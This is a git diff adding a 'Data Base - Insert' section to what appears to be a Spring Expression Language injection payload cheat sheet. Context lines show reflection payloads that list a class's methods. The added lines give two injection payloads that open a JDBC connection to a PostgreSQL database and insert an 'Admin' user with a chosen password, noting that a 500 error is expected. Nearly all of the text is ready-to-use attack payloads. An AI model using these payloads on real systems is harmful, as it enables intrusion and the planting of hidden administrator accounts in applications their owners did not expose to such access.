@@ -107,3 +107,11 @@ T(java.util.Arrays).toString("".getClass().forName("java.lang.Package").getMetho
 // replace org.myapplication.User to your class
 "".getClass().forName("java.util.Arrays").getMethod("toString","".getClass().forName("[Ljava.lang.Object;") ).invoke("",new java.lang.Object[]{"".getClass().forName("org.myapplication.User").getDeclaredMethods()})
 ```
+
+## Data Base - Insert
+```java
+//NOTE: you need to URL encode '&' in db connection string, result will be 500, thats ok 
+T(java.sql.DriverManager).getConnection('jdbc:postgresql://127.0.0.1:5432/test?user=postgres%26password=mysecretpassword').createStatement().executeQuery("INSERT INTO users (name, surname, login, email, password) VALUES ('Admin', 'Admin', 'Admin', 'admin@example.com', 'P@ssw0rd123');")
+
+"".getClass().forName("java.sql.DriverManager").getMethod("getConnection","".getClass()).invoke(null,"jdbc:postgresql://127.0.0.1:5432/test?user=postgres%26password=mysecretpassword").createStatement().executeQuery("INSERT INTO users (name, surname, login, email, password) VALUES ('Admin', 'Admin', 'Admin', 'admin@example.com', 'P@ssw0rd123');")
+```
